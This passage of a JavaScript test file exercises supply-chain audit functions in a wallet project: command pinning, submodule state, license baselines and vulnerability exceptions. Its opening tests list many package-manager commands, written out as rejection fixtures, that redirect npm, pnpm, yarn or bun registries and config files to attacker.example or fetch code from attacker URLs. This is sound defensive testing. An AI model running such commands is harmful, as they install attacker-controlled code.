        'npm init --registry https://attacker.example starter@1.2.3',
        'npm --registry=https://attacker.example init starter@1.2.3',
        'npm --@scope:registry=https://attacker.example init @scope/starter@1.2.3',
        'npm init starter@1.2.3 --registry=https://attacker.example',
        'npm init starter@1.2.3 --userconfig=./attacker.npmrc',
        'npm --registry=https://attacker.example exec tool@1.2.3',
        'npm exec tool@1.2.3 --registry=https://attacker.example',
        'npm exec --package tool@1.2.3 --globalconfig ./attacker.npmrc -- tool',
        'npx tool@1.2.3 --registry=https://attacker.example',
        'pnpm --registry=https://attacker.example create starter@1.2.3',
        'pnpm create starter@1.2.3 --registry=https://attacker.example',
        'pnpm --config.registry=https://attacker.example create starter@1.2.3',
        'pnpm dlx tool@1.2.3 --config-dir ./attacker-config',
        'pnx tool@1.2.3 --registry=https://attacker.example',
        'pnpx --userconfig=./attacker.npmrc tool@1.2.3',
        'yarn dlx tool@1.2.3 --registry=https://attacker.example',
        'bunx tool@1.2.3 --registry=https://attacker.example',
        'bun x tool@1.2.3 --registry=https://attacker.example',
        'npm_config_registry=https://attacker.example npm exec tool@1.2.3',
        'NPM_CONFIG_REGISTRY=https://attacker.example npx tool@1.2.3',
        'env npm_config_userconfig=./attacker.npmrc pnpm dlx tool@1.2.3',
        'NPM_CONFIG_GLOBALCONFIG=./attacker.npmrc yarn dlx tool@1.2.3',
        'npm_config_config_registry=https://attacker.example bunx tool@1.2.3',
        "env 'npm_config_@scope:registry=https://attacker.example/' npm exec @scope/tool@1.2.3",
        'npm --reg=https://attacker.example exec tool@1.2.3',
        'env:\n  NPM_CONFIG_REGISTRY: https://attacker.example\nsteps:\n  - run: npm exec tool@1.2.3',
        // npm reads <prefix>/etc/npmrc, so an environment prefix redirects
        // resolution exactly like the rejected --prefix option.
        'npm_config_prefix=./attacker npm exec tool@1.2.3',
        'NPM_CONFIG_PREFIX=./attacker npx tool@1.2.3',
        'PREFIX=./attacker npm exec tool@1.2.3',
        'env PREFIX=./attacker npm x tool@1.2.3',
      ],
    },
    {
      file: '.github/workflows/runner.yml',
      commands: [
        'steps:\n  - run: npm exec tool@1.2.3\n    env:\n      NPM_CONFIG_REGISTRY: https://attacker.example',
        'steps:\n  - run: npm exec tool@1.2.3\n    env:\n      PREFIX: ./attacker',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 33)
  assert.equal(rejected.errors.length, 33)
  assert.match(rejected.errors.join('\n'), /--registry=https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /--@scope:registry=/)
  assert.match(rejected.errors.join('\n'), /--userconfig=/)
  assert.match(rejected.errors.join('\n'), /--globalconfig/)
  assert.match(rejected.errors.join('\n'), /--config\.registry=/)
  assert.match(rejected.errors.join('\n'), /--config-dir/)
  assert.match(rejected.errors.join('\n'), /npm_config_registry/)
  assert.match(rejected.errors.join('\n'), /NPM_CONFIG_REGISTRY/)
  assert.match(rejected.errors.join('\n'), /npm_config_userconfig/)
  assert.match(rejected.errors.join('\n'), /NPM_CONFIG_GLOBALCONFIG/)
  assert.match(rejected.errors.join('\n'), /npm_config_config_registry/)
  assert.match(rejected.errors.join('\n'), /npm_config_@scope:registry/)
  assert.match(rejected.errors.join('\n'), /--reg=/)
  assert.match(rejected.errors.join('\n'), /npm_config_prefix/)
  assert.match(rejected.errors.join('\n'), /NPM_CONFIG_PREFIX/)
  assert.equal(rejected.errors.filter(error => /: PREFIX$/.test(error)).length, 3)

  const forwarded = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init starter@1.2.3 -- --registry=https://attacker.example',
        'npm exec -- tool@1.2.3 --registry=https://attacker.example',
        'npx -- tool@1.2.3 --registry=https://attacker.example',
        'pnpm create -- starter@1.2.3 --registry=https://attacker.example',
        'pnpm dlx -- tool@1.2.3 --registry=https://attacker.example',
        'pnx -- tool@1.2.3 --registry=https://attacker.example',
        'npm exec -- tool@1.2.3 NPM_CONFIG_REGISTRY=https://attacker.example',
        'npm exec -- tool@1.2.3 PREFIX=./attacker',
      ],
    },
  ])
  assert.deepEqual(forwarded, { commandCount: 8, errors: [] })
})

test('executable dependency command audit covers pinned pnpm create normalization', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpm create starter',
        'pnpm create starter@latest',
        'pnpm create create-starter@^1.2.3',
        'corepack pnpm --silent create @scope/starter@next',
        'pnpm create @scope',
        'pnpm create @scope@1.2.3',
        'pnpm create https://attacker.example/starter.tgz@1.2.3',
        'pnpm create github:attacker/starter@1.2.3',
        'pnpm create ../starter@1.2.3',
        'pnpm create starter@npm:safe@1.2.3',
        'pnpm create --mystery starter@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 11)
  assert.equal(rejected.errors.length, 11)
  assert.match(rejected.errors.join('\n'), /create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /create-starter@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /@scope\/create-starter@next/)
  assert.match(rejected.errors.join('\n'), /@scope\/create/)
  assert.match(rejected.errors.join('\n'), /https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /github:/)
  assert.match(rejected.errors.join('\n'), /starter@npm:safe@1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /--mystery/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpm create starter@1.2.3',
        'pnpm create create-starter@1.2.3',
        'pnpm create @scope/starter@1.2.3',
        'pnpm create @scope/create-starter@1.2.3',
        'pnpm create starter@1.2.3-beta.1+build.5',
        'pnpm create -- starter@1.2.3',
        'pnpm create --use-node-version 18.0.0 starter@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 7, errors: [] })
})

test('executable dependency command audit covers Yarn create and yarnpkg variants', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'yarn create starter',
        'yarn create starter@latest',
        'yarn create @scope/starter@^1.2.3',
        'yarnpkg dlx mutable-tool',
        'yarnpkg create starter',
        'yarnpkg create https://attacker.example/starter.tgz@1.2.3',
        'yarnpkg create attacker/starter',
        'corepack yarnpkg dlx @scope/tool@latest',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 8)
  assert.equal(rejected.errors.length, 8)
  assert.match(rejected.errors.join('\n'), /create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/create-starter@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /mutable-tool/)
  assert.match(rejected.errors.join('\n'), /https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /attacker\/starter/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@latest/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'yarn create starter@1.2.3',
        'yarn create @scope/starter@1.2.3',
        'yarnpkg dlx tool@1.2.3',
        'yarnpkg dlx @scope/tool@1.2.3',
        'yarnpkg create starter@1.2.3-beta.1+build.5',
        'corepack yarnpkg create @scope/starter@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 6, errors: [] })
})

test('executable dependency command audit covers Bun x and create forms', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'bun x mutable-tool',
        'bun x @scope/tool@latest',
        'bun create starter',
        'bun create starter@latest',
        'bun create @scope/starter@^1.2.3',
        'bun create https://attacker.example/starter.tgz@1.2.3',
        'bun create attacker/starter',
        'bun create ../starter@1.2.3',
        'bun create starter@npm:safe@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 9)
  assert.equal(rejected.errors.length, 9)
  assert.match(rejected.errors.join('\n'), /mutable-tool/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@latest/)
  assert.match(rejected.errors.join('\n'), /create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/create-starter@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /attacker\/starter/)
  assert.match(rejected.errors.join('\n'), /\.\.\/starter@1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /starter@npm:safe@1\.2\.3/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'bun x tool@1.2.3',
        'bun x @scope/tool@1.2.3',
        'bun create starter@1.2.3',
        'bun create @scope/starter@1.2.3',
        'bun --bun create starter@1.2.3-beta.1+build.5',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 5, errors: [] })
})

test('submodule audit requires initialized checkouts at their recorded gitlinks', () => {
  const valid = auditSubmoduleStatus(
    ` 1111111111111111111111111111111111111111 external/first (heads/main)
 2222222222222222222222222222222222222222 external/second (heads/main)
`
  )
  assert.deepEqual(valid, { errors: [], submoduleCount: 2 })

  const invalid = auditSubmoduleStatus(
    `-1111111111111111111111111111111111111111 external/uninitialized
+2222222222222222222222222222222222222222 external/drifted (heads/main)
U3333333333333333333333333333333333333333 external/conflicted
`
  )
  assert.equal(invalid.submoduleCount, 3)
  assert.match(invalid.errors.join('\n'), /external\/uninitialized.*not initialized/)
  assert.match(invalid.errors.join('\n'), /external\/drifted.*does not match/)
  assert.match(invalid.errors.join('\n'), /external\/conflicted.*merge conflicts/)
})

test('tracked file discovery includes every workspace manifest', () => {
  const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..')
  const files = trackedFiles(repoRoot)
  for (const file of [
    'package.json',
    'apps/extension/package.json',
    'packages/keyring-service/package.json',
    'packages/wallet-background/package.json',
  ]) {
    assert.ok(files.includes(file), `${file} must be audited`)
  }
})

test('license audit rejects new expressions and requires evidence for known Unknown entries', () => {
  const report = {
    MIT: [{ name: 'approved', version: '1.0.0' }],
    Unknown: [
      { name: 'bigi', version: '1.4.2' },
      { name: 'new-package', version: '1.0.0' },
    ],
    AGPL: [{ name: 'copyleft', version: '1.0.0' }],
  }
  const audit = auditLicenseReport(report, dependency => dependency.name === 'bigi')
  assert.equal(audit.packageCount, 4)
  assert.equal(audit.errors.length, 2)
  assert.match(audit.errors.join('\n'), /new-package@1\.0\.0/)
  assert.match(audit.errors.join('\n'), /copyleft@1\.0\.0/)
})

test('license baseline fails on added, removed, or changed package license records', () => {
  const report = {
    MIT: [{ name: 'approved', version: '1.0.0' }],
    'Apache-2.0': [{ name: 'added', version: '2.0.0' }],
  }
  const baseline = {
    schemaVersion: 1,
    command: 'corepack pnpm licenses list --json --long',
    packageCount: 2,
    packages: {
      'approved@1.0.0': 'Apache-2.0',
      'removed@1.0.0': 'MIT',
    },
  }
  const audit = auditLicenseBaseline(report, baseline)
  assert.equal(audit.packageCount, 2)
  assert.match(audit.errors.join('\n'), /new license record.*added@2\.0\.0/)
  assert.match(audit.errors.join('\n'), /license change.*approved@1\.0\.0/)
  assert.match(audit.errors.join('\n'), /removed license record.*removed@1\.0\.0/)
})

test('lockfile license baseline covers every exact package identity and binds the lockfile', () => {
  const lockfile = `packages:
  /also-trusted@2.0.0:
    resolution: {integrity: sha512-ZGVmZw==}
  /trusted@1.0.0:
    resolution: {integrity: sha512-YWJjZA==}
`
  const baseline = {
    schemaVersion: 2,
    source: 'reviewed package metadata for every sha512-bound pnpm-lock.yaml name@version identity',
    lockfileSha256: createHash('sha256').update(lockfile).digest('hex'),
    packageCount: 2,
    packages: {
      'also-trusted@2.0.0': 'Apache-2.0',
      'trusted@1.0.0': 'MIT',
    },
  }
  assert.deepEqual(auditLockfileLicenseBaseline(lockfile, baseline), {
    errors: [],
    packageCount: 2,
    pendingReview: [],
  })

  const changedLockfile = lockfile.replace('sha512-YWJjZA==', 'sha512-dHJ1c3RlZA==')
  assert.match(
    auditLockfileLicenseBaseline(changedLockfile, baseline).errors.join('\n'),
    /license review is not bound to this lockfile/
  )

  const addedLockfile = `${lockfile}  /new-package@3.0.0:
    resolution: {integrity: sha512-bmV3Cg==}
`
  const addedBaseline = {
    ...baseline,
    lockfileSha256: createHash('sha256').update(addedLockfile).digest('hex'),
  }
  assert.match(
    auditLockfileLicenseBaseline(addedLockfile, addedBaseline).errors.join('\n'),
    /new lockfile license record requires review: new-package@3\.0\.0/
  )

  const removedBaseline = {
    ...baseline,
    packageCount: 3,
    packages: { ...baseline.packages, 'removed@1.0.0': 'MIT' },
  }
  assert.match(
    auditLockfileLicenseBaseline(lockfile, removedBaseline).errors.join('\n'),
    /removed lockfile license record requires review: removed@1\.0\.0/
  )

  const unapprovedBaseline = {
    ...baseline,
    packages: { ...baseline.packages, 'trusted@1.0.0': 'GPL-3.0' },
  }
  assert.match(
    auditLockfileLicenseBaseline(lockfile, unapprovedBaseline).errors.join('\n'),
    /trusted@1\.0\.0 has unapproved license expression: GPL-3\.0/
  )
})

test('lockfile license baseline verifies reviewed Unknown license evidence', () => {
  const lockfile = `packages:
  /bigi@1.4.2:
    resolution: {integrity: sha512-YmlnaQ==}
`
  const baseline = {
    schemaVersion: 2,
    source: 'reviewed package metadata for every sha512-bound pnpm-lock.yaml name@version identity',
    lockfileSha256: createHash('sha256').update(lockfile).digest('hex'),
    packageCount: 1,
    packages: { 'bigi@1.4.2': 'Unknown' },
  }
  assert.deepEqual(
    auditLockfileLicenseBaseline(
      lockfile,
      baseline,
      dependency => dependency.name === 'bigi' && dependency.version === '1.4.2'
    ),
    { errors: [], packageCount: 1, pendingReview: [] }
  )
  assert.match(
    auditLockfileLicenseBaseline(lockfile, baseline).errors.join('\n'),
    /unknown-license evidence does not match/
  )
})

test('lockfile license baseline onboarding records new identities as pending review', () => {
  const source =
    'reviewed package metadata for every sha512-bound pnpm-lock.yaml name@version identity'
  const lockfile = `packages:
  /added@3.0.0:
    resolution: {integrity: sha512-YWRkZWQ=}
  /trusted@1.0.0:
    resolution: {integrity: sha512-YWJjZA==}
`
  const current = {
    schemaVersion: 2,
    source,
    lockfileSha256: 'stale',
    packageCount: 2,
    packages: { 'removed@2.0.0': 'MIT', 'trusted@1.0.0': 'MIT' },
  }
  const observed = []
  const { baseline, added, removed } = buildLockfileLicenseBaseline(lockfile, current, dependency => {
    observed.push(dependency)
    return dependency.name === 'added' ? 'ISC' : null
  })
  assert.deepEqual(added, ['added@3.0.0'])
  assert.deepEqual(removed, ['removed@2.0.0'])
  assert.deepEqual(observed, [{ name: 'added', version: '3.0.0' }])
  assert.deepEqual(baseline, {
    schemaVersion: 2,
    source,
    lockfileSha256: createHash('sha256').update(lockfile).digest('hex'),
    packageCount: 2,
    packages: { 'added@3.0.0': 'pending-review: ISC', 'trusted@1.0.0': 'MIT' },
  })

  const policyAudit = auditLockfileLicenseBaseline(lockfile, baseline)
  assert.deepEqual(policyAudit.pendingReview, ['added@3.0.0'])
  assert.deepEqual(policyAudit.errors, [
    'added@3.0.0 license record is pending review: pending-review: ISC',
  ])

  const writeAudit = auditLockfileLicenseBaseline(lockfile, baseline, () => false, {
    allowPendingReview: true,
  })
  assert.deepEqual(writeAudit, { errors: [], packageCount: 2, pendingReview: ['added@3.0.0'] })

  for (const marker of ['pending-review', 'pending-review: MIT', 'pending-review:']) {
    const pending = { ...baseline, packages: { ...baseline.packages, 'added@3.0.0': marker } }
    assert.match(
      auditLockfileLicenseBaseline(lockfile, pending).errors.join('\n'),
      /added@3\.0\.0 license record is pending review/
    )
  }

  const reviewed = { ...baseline, packages: { ...baseline.packages, 'added@3.0.0': 'ISC' } }
  assert.deepEqual(auditLockfileLicenseBaseline(lockfile, reviewed), {
    errors: [],
    packageCount: 2,
    pendingReview: [],
  })
  const copyleft = { ...baseline, packages: { ...baseline.packages, 'added@3.0.0': 'GPL-3.0' } }
  assert.match(
    auditLockfileLicenseBaseline(lockfile, copyleft).errors.join('\n'),
    /added@3\.0\.0 has unapproved license expression: GPL-3\.0/
  )

  const unobserved = buildLockfileLicenseBaseline(lockfile, current)
  assert.equal(
    unobserved.baseline.packages['added@3.0.0'],
    'pending-review: license metadata unavailable'
  )

  const rerun = buildLockfileLicenseBaseline(lockfile, baseline, () => 'MIT')
  assert.equal(rerun.baseline.packages['added@3.0.0'], 'pending-review: ISC')
  assert.deepEqual(rerun.added, [])
  assert.deepEqual(rerun.removed, [])

  assert.throws(
    () => buildLockfileLicenseBaseline('packages: {}\n', current),
    /contains no package identities/
  )
})

const CSS_MODULE_REFERENCE = ['typed-css', 'modules'].join('-')
const CSS_LOADER_REFERENCE = ['typed-css', 'modules-loader'].join('-')

function vulnerabilityFixture() {
  return {
    metadata: {
      vulnerabilities: { info: 0, low: 0, moderate: 0, high: 1, critical: 0 },
    },
    advisories: {
      1: {
        id: 1,
        module_name: 'postcss',
        severity: 'high',
        url: 'https://github.com/advisories/GHSA-aaaa-bbbb-cccc',
        findings: [
          {
            version: '7.0.0',
            paths: [
              `apps/extension > ${CSS_LOADER_REFERENCE}@0.0.18 > ${CSS_MODULE_REFERENCE}@0.6.8 > postcss@7.0.0`,
            ],
          },
        ],
      },
    },
  }
}

function exceptionFixture() {
  return {
    schemaVersion: 2,
    exceptions: [
      {
        advisory: 'GHSA-aaaa-bbbb-cccc',
        package: 'postcss',
        severity: 'high',
        versions: ['7.0.0'],
        paths: [
          `apps/extension > ${CSS_LOADER_REFERENCE}@0.0.18 > ${CSS_MODULE_REFERENCE}@0.6.8 > postcss@7.0.0`,
        ],
        reachability: 'demonstrably-unreachable',
        reachabilityGuard: {
          type: 'tracked-source-absence',
          references: [CSS_MODULE_REFERENCE, CSS_LOADER_REFERENCE],
          allowedDependencyDeclaration: {
            file: 'apps/extension/package.json',
            section: 'devDependencies',
            name: CSS_LOADER_REFERENCE,
            specifier: '^0.0.18',
          },
        },
        reachabilityAnalysis: 'The loader is not referenced by any build configuration.',
        compensatingControls: ['Tracked-source checks reject activation of this loader.'],
        owner: '@maintainer',
        expiresOn: '2026-10-31',
        removalPlan: 'Remove the unused loader and regenerate the lockfile.',
        trackingIssue: 'https://github.com/Qbit-Org/qbit-wallet/issues/161',
      },
    ],
  }
}

function trackedSourceContextFixture(extraFiles = [], manifestOverrides = {}) {
  return {
    files: [
      {
        file: 'apps/extension/package.json',
        source: JSON.stringify({
          scripts: { build: 'webpack' },
          devDependencies: { [CSS_LOADER_REFERENCE]: '^0.0.18' },
          ...manifestOverrides,
        }),
      },
      { file: 'webpack.config.cjs', source: 'module.exports = {}' },
      ...extraFiles,
    ],
  }
}

test('vulnerability audit accepts only an exact, current, accountable disposition', () => {
  const audit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    exceptionFixture(),
    new Date('2026-07-31T12:00:00.000Z'),
    trackedSourceContextFixture()
  )
  assert.deepEqual(audit, { errors: [], acceptedCount: 1, blockingCount: 1 })
})

test('vulnerability audit rejects a tracking issue outside Qbit-Org/qbit-wallet', () => {
  for (const trackingIssue of [
    'https://github.com/example-org/qbit-wallet/issues/161',
    'https://github.com/Qbit-Org/qbit/issues/161',
    'https://github.com/Qbit-Org/qbit-wallet/pull/161',
  ]) {
    const exceptions = exceptionFixture()
    exceptions.exceptions[0].trackingIssue = trackingIssue
    const audit = auditVulnerabilityReport(
      vulnerabilityFixture(),
      exceptions,
      new Date('2026-07-31T12:00:00.000Z'),
      trackedSourceContextFixture()
    )
    assert.equal(audit.acceptedCount, 0, trackingIssue)
    assert.match(
      audit.errors.join('\n'),
      /risk exception trackingIssue must be in Qbit-Org\/qbit-wallet/,
      trackingIssue
    )
  }
})

test('vulnerability audit ignores only fixed non-executable reference provenance', () => {
  const context = trackedSourceContextFixture([
    { file: 'docs/dependency-note.md', source: CSS_LOADER_REFERENCE },
    { file: 'pnpm-lock.yaml', source: CSS_LOADER_REFERENCE },
    {
      file: 'scripts/security/dependency-license-baseline.json',
      source: CSS_MODULE_REFERENCE,
    },
    {
      file: 'scripts/security/dependency-risk-exceptions.json',
      source: CSS_MODULE_REFERENCE,
    },
    { file: 'docs/security/dependency-audit.json', source: CSS_LOADER_REFERENCE },
    { file: 'docs/security/dependency-inventory.json', source: CSS_MODULE_REFERENCE },
  ])
  const audit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    exceptionFixture(),
    new Date('2026-07-31T12:00:00.000Z'),
    context
  )
  assert.deepEqual(audit, { errors: [], acceptedCount: 1, blockingCount: 1 })
})

test('vulnerability audit rejects tracked build, manifest script, and source activation', () => {
  const now = new Date('2026-07-31T12:00:00.000Z')
  const mutations = [
    trackedSourceContextFixture([
      {
        file: 'webpack.activate.cjs',
        source: `module.exports = { loader: '${CSS_LOADER_REFERENCE}' }`,
      },
    ]),
    trackedSourceContextFixture([], {
      scripts: { build: `webpack --loader ${CSS_LOADER_REFERENCE}` },
      devDependencies: { [CSS_LOADER_REFERENCE]: '^0.0.18' },
    }),
    trackedSourceContextFixture([
      {
        file: 'apps/extension/src/styles.ts',
        source: `export const typeGenerator = '${CSS_MODULE_REFERENCE}'`,
      },
    ]),
    trackedSourceContextFixture([
      {
        file: 'docs/build-example.cjs',
        source: `module.exports = '${CSS_LOADER_REFERENCE}'`,
      },
    ]),
  ]

  for (const context of mutations) {
    const audit = auditVulnerabilityReport(vulnerabilityFixture(), exceptionFixture(), now, context)
    assert.equal(audit.acceptedCount, 0)
    assert.match(audit.errors.join('\n'), /forbidden tracked-source reference/)
  }
})

test('vulnerability audit fails closed on missing, malformed, or stale reachability guards', () => {
  const now = new Date('2026-07-31T12:00:00.000Z')

  const missingGuard = exceptionFixture()
  delete missingGuard.exceptions[0].reachabilityGuard
  const missingAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    missingGuard,
    now,
    trackedSourceContextFixture()
  )
  assert.equal(missingAudit.acceptedCount, 0)
  assert.match(missingAudit.errors.join('\n'), /require an exact tracked-source-absence/)

  const arbitraryExclusion = exceptionFixture()
  arbitraryExclusion.exceptions[0].reachabilityGuard.excludePaths = ['webpack.config.cjs']
  const exclusionAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    arbitraryExclusion,
    now,
    trackedSourceContextFixture()
  )
  assert.equal(exclusionAudit.acceptedCount, 0)
  assert.match(exclusionAudit.errors.join('\n'), /require an exact tracked-source-absence/)

  const incompleteReferences = exceptionFixture()
  incompleteReferences.exceptions[0].reachabilityGuard.references = [CSS_LOADER_REFERENCE]
  const incompleteAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    incompleteReferences,
    now,
    trackedSourceContextFixture()
  )
  assert.equal(incompleteAudit.acceptedCount, 0)
  assert.match(incompleteAudit.errors.join('\n'), /must exactly cover.*direct path activations/)

  const staleDeclaration = exceptionFixture()
  staleDeclaration.exceptions[0].reachabilityGuard.allowedDependencyDeclaration.specifier = '0.0.17'
  const staleAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    staleDeclaration,
    now,
    trackedSourceContextFixture()
  )
  assert.equal(staleAudit.acceptedCount, 0)
  assert.match(staleAudit.errors.join('\n'), /allowed dependency declaration is stale/)

  const missingContextAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    exceptionFixture(),
    now
  )
  assert.equal(missingContextAudit.acceptedCount, 0)
  assert.match(missingContextAudit.errors.join('\n'), /requires a non-empty tracked-source context/)
})

test('vulnerability audit rejects unaccepted, changed, expired, and stale exceptions', () => {
  const now = new Date('2026-07-31T12:00:00.000Z')
  const unaccepted = auditVulnerabilityReport(
    vulnerabilityFixture(),
    { schemaVersion: 2, exceptions: [] },
    now
  )
  assert.match(unaccepted.errors.join('\n'), /unaccepted high advisory/)

  const changed = exceptionFixture()
  changed.exceptions[0].paths = ['app > newly-reachable > postcss@7.0.0']
  assert.match(
    auditVulnerabilityReport(
      vulnerabilityFixture(),
      changed,
      now,
      trackedSourceContextFixture()
    ).errors.join('\n'),
    /versions, or paths changed/
  )

  const expired = exceptionFixture()
  expired.exceptions[0].expiresOn = '2026-07-30'
  const expiredAudit = auditVulnerabilityReport(
    vulnerabilityFixture(),
    expired,
    now,
    trackedSourceContextFixture()
  )
  assert.equal(expiredAudit.acceptedCount, 0)
  assert.match(expiredAudit.errors.join('\n'), /expired on 2026-07-30/)

  const fixedReport = vulnerabilityFixture()
  fixedReport.advisories = {}
  fixedReport.metadata.vulnerabilities.high = 0
  assert.match(
    auditVulnerabilityReport(
      fixedReport,
      exceptionFixture(),
      now,
      trackedSourceContextFixture()
    ).errors.join('\n'),
    /stale dependency risk exception/
  )

  const missingAdvisories = vulnerabilityFixture()
  missingAdvisories.advisories = {}
  assert.match(
    auditVulnerabilityReport(
      missingAdvisories,
      { schemaVersion: 2, exceptions: [] },
      now
    ).errors.join('\n'),
    /critical\/high occurrences without advisory records/
  )

  const contradictoryMetadata = vulnerabilityFixture()
  contradictoryMetadata.metadata.vulnerabilities.high = 0
  assert.match(
    auditVulnerabilityReport(
      contradictoryMetadata,
      exceptionFixture(),
      now,
      trackedSourceContextFixture()
    ).errors.join('\n'),
    /advisory records contradict zero critical\/high occurrences/
  )

  const mismatchedOccurrences = vulnerabilityFixture()
  mismatchedOccurrences.metadata.vulnerabilities.high = 2
  assert.match(
    auditVulnerabilityReport(
      mismatchedOccurrences,
      exceptionFixture(),
      now,
      trackedSourceContextFixture()
    ).errors.join('\n'),
    /metadata reports 2 occurrences but advisory findings report 1/
  )
})

// Digests the inventory recorded at c1098b394 ("security: refresh reviewed
// dependency licenses"), where the license baseline was rebound to the new
// lockfile but the inventory still described the previous one. That lockfile is
// byte identical to the one committed here, so pairing these recorded digests
// with the committed files reconstructs the state that still reported PASS.
const STALE_INVENTORY_LOCKFILE_SHA256 =
  'a95a15f40da43f4e9abef87f1258dc78b06485c180d8b5814c97092dd785a6c9'
const STALE_INVENTORY_AUDIT_SHA256 =
  'be05aea6a40bd5bce61442121d12fda7758ef823a543e734094fed2e90589172'
const INVENTORY_FILE = 'docs/security/dependency-inventory.json'
const AUDIT_FILE = 'docs/security/dependency-audit.json'

function committedDependencyEvidence() {
  const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..')
  const read = file => readFileSync(join(repoRoot, file), 'utf8')
  return {
    inventoryText: read(INVENTORY_FILE),
    lockfileText: read('pnpm-lock.yaml'),
    auditText: read(AUDIT_FILE),
  }
}

function withInventory(inventoryText, mutate) {
  const inventory = JSON.parse(inventoryText)
  mutate(inventory)
  return `${JSON.stringify(inventory, null, 2)}\n`
}

function evidenceFixture(overrides = {}, auditOutputOverrides = {}) {
  const lockfileText = "lockfileVersion: '6.1'\npackages: {}\n"
  const auditText = '{"advisories":{},"metadata":{}}\n'
  const digest = text => createHash('sha256').update(text).digest('hex')
  const inventory = {
    schemaVersion: 1,
    auditedCommit: '0f12d7b815775a0178f08c0dbfe6b346a0b5fc64',
    lockfileSha256: digest(lockfileText),
    auditOutput: {
      file: AUDIT_FILE,
      sha256: digest(auditText),
      command: 'corepack pnpm audit --json',
      ...auditOutputOverrides,
    },
    ...overrides,
  }
  return { lockfileText, auditText, inventoryText: `${JSON.stringify(inventory, null, 2)}\n` }
}

function auditEvidenceFixture(overrides, auditOutputOverrides) {
  const { inventoryText, lockfileText, auditText } = evidenceFixture(
    overrides,
    auditOutputOverrides
  )
  return auditDependencyEvidence(inventoryText, lockfileText, auditText)
}

test('dependency evidence audit binds the committed inventory to its lockfile and raw audit', () => {
  const { inventoryText, lockfileText, auditText } = committedDependencyEvidence()
  assert.deepEqual(auditDependencyEvidence(inventoryText, lockfileText, auditText), {
    errors: [],
    boundFiles: 2,
  })

  // Evidence is regenerated and committed after the source commit it audits, so
  // the recorded commit trails HEAD by design and is deliberately not bound.
  const rewritten = withInventory(inventoryText, inventory => {
    inventory.auditedCommit = '0'.repeat(40)
  })
  assert.deepEqual(auditDependencyEvidence(rewritten, lockfileText, auditText), {
    errors: [],
    boundFiles: 2,
  })
})

test('dependency evidence audit rejects the inventory left stale by a refreshed license baseline', () => {
  const { inventoryText, lockfileText, auditText } = committedDependencyEvidence()
  const lockfileSha256 = createHash('sha256').update(lockfileText).digest('hex')
  assert.notEqual(lockfileSha256, STALE_INVENTORY_LOCKFILE_SHA256)

  const stale = withInventory(inventoryText, inventory => {
    inventory.lockfileSha256 = STALE_INVENTORY_LOCKFILE_SHA256
  })
  assert.deepEqual(auditDependencyEvidence(stale, lockfileText, auditText), {
    errors: [
      `${INVENTORY_FILE} is not bound to this pnpm-lock.yaml: expected ${lockfileSha256}, found ${STALE_INVENTORY_LOCKFILE_SHA256}`,
    ],
    boundFiles: 1,
  })
})

test('dependency evidence audit rejects an inventory bound to a superseded raw audit', () => {
  const { inventoryText, lockfileText, auditText } = committedDependencyEvidence()
  const auditSha256 = createHash('sha256').update(auditText).digest('hex')
  assert.notEqual(auditSha256, STALE_INVENTORY_AUDIT_SHA256)

  const stale = withInventory(inventoryText, inventory => {
    inventory.auditOutput.sha256 = STALE_INVENTORY_AUDIT_SHA256
  })
  assert.deepEqual(auditDependencyEvidence(stale, lockfileText, auditText), {
    errors: [
      `${INVENTORY_FILE} is not bound to this ${AUDIT_FILE}: expected ${auditSha256}, found ${STALE_INVENTORY_AUDIT_SHA256}`,
    ],
    boundFiles: 1,
  })
})

test('dependency evidence audit fails closed on malformed inventory documents', () => {
  const malformed = auditDependencyEvidence('{"schemaVersion":', 'lock', 'audit')
  assert.equal(malformed.boundFiles, 0)
  assert.equal(malformed.errors.length, 1)
  assert.match(malformed.errors[0], new RegExp(`^${INVENTORY_FILE} is not valid JSON: `))

  for (const inventoryText of ['null', '[]', '"evidence"', '7']) {
    assert.deepEqual(auditDependencyEvidence(inventoryText, 'lock', 'audit'), {
      errors: [`${INVENTORY_FILE} must be a JSON object`],
      boundFiles: 0,
    })
  }

  for (const schemaVersion of [undefined, 0, 2, '1', null]) {
    assert.deepEqual(auditEvidenceFixture({ schemaVersion }).errors, [
      `${INVENTORY_FILE} must use schemaVersion 1`,
    ])
  }
})

test('dependency evidence audit fails closed on malformed or missing digest fields', () => {
